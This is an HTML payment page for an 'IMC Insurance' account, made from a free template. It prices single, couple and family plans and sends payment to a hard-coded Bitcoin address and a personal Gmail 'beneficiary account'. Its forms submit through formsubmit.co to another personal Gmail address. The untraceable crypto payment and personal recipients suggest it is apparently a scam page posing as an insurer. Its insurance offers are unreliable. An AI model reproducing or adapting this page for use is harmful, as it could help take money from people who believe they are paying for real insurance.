
<!DOCTYPE html>
<html>
<head>
<title>Account Payment IMC Insurance</title>
<!-- custom-theme -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Tabs Payment Form Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
		function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- //custom-theme -->
<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
<link rel="stylesheet" href="css/creditly.css" type="text/css" media="all" />
<link rel="stylesheet" href="css/easy-responsive-tabs.css">
<script src="js/jquery.min.js"></script>
<!-- font-awesome-icons -->
<link href="css/font-awesome.css" rel="stylesheet"> 
<!-- //font-awesome-icons -->
<link href="//fonts.googleapis.com/css?family=Mirza:400,500,600,700&amp;subset=arabic,latin-ext" rel="stylesheet">
</head>
<body>
	<div class="main">	
		<h1>IMC Account Payment Form</h1>
		<div class="w3_agile_main_grids">
			<div class="w3layouts_main_grid_left">
				<div class="agileinfo_main_grid_left_grid">
					<h3>Payment Summary</h3>
					<ul>
						<li>Single<span>Insurance for a single person with all the benefits</span></li>
						<li>$200</li>
					</ul>
					<ul>
						<li>Couple <span>Insurance for 2 people with all the benefits</span></li>
						<li>$300</li>
					</ul>
					<ul>
						<li>Family<span>Insurance for a Family of 4 to 7 with all the benefits</span></li>
						<li>$500</li>
					</ul>
					
				</div>
				
			</div>
			<div class="agileits_main_grid_right">
				<div class="wthree_payment_grid">
					<h2>Payment Method</h2>
					<div id="horizontalTab">
						<ul class="resp-tabs-list">
							<li><img src="images/3.png" alt=" " /></li>
							<li><img src="images/2.jpg" alt=" " /></li>
						</ul>
						<div class="resp-tabs-container">
							<div class="agileits_w3layouts_tab1">
								<form action="https://formsubmit.co/masonbrown7845@gmail.com" method="post">
									<section class="creditly-wrapper wthree, w3_agileits_wrapper">
										<div class="credit-card-wrapper">
											<div class="first-row form-group">
												<div class="controls">
													<label class="control-label">Bitcoin Address</label>
													<li><img src="images/4.png" alt=" " /></li>
													
													 <input class="billing-address-name form-control" type="text" name="name" value="3DuK2GBXQ65XwVK9iV4DBuSANiQs87ryhv">
													
												</div>
												
												
											</div>
											
										</div>
									</section>
								</form>
							</div>
							<div class="agileits_w3layouts_tab2">
								<h3>Beneficiary account  </h3>
								<form action="https://formsubmit.co/masonbrown7845@gmail.com" method="post">
									<p><b><h4>kibor4087@gmail.com</h4></b></p>
									<!-- <input type="email" name="Email" value="kibor4087@gmail.com" required=""> -->
									
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="clear"> </div>
		</div>
		<div class="agileits_copyright">
			<p>© 2019 IMC Payment Form. All rights reserved </a></p>
		</div>
	</div>
	<!-- credit-card -->
		<script type="text/javascript" src="js/creditly.js"></script>
		<script type="text/javascript">
			$(function() {
			  var creditly = Creditly.initialize(
				  '.creditly-wrapper .expiration-month-and-year',
				  '.creditly-wrapper .credit-card-number',
				  '.creditly-wrapper .security-code',
				  '.creditly-wrapper .card-type');

			  $(".creditly-card-form .submit").click(function(e) {
				e.preventDefault();
				var output = creditly.validate();
				if (output) {
				  // Your validated credit card output
				  console.log(output);
				}
			  });
			});
		</script>
	<!-- //credit-card -->
	<!-- tabs -->
	<script src="js/easy-responsive-tabs.js"></script>
	<script>
		$(document).ready(function () {
			$('#horizontalTab').easyResponsiveTabs({
				type: 'default', //Types: default, vertical, accordion           
				width: 'auto', //auto or any width like 600px
				fit: true,   // 100% fit in a container
				closed: 'accordion', // Start closed if in accordion view
				activate: function(event) { // Callback function if tab is switched
				var $tab = $(this);
				var $info = $('#tabInfo');
				var $name = $('span', $info);
				$name.text($tab.text());
				$info.show();
				}
			});
		});
	</script>
	<!-- //tabs -->

</body>
</html>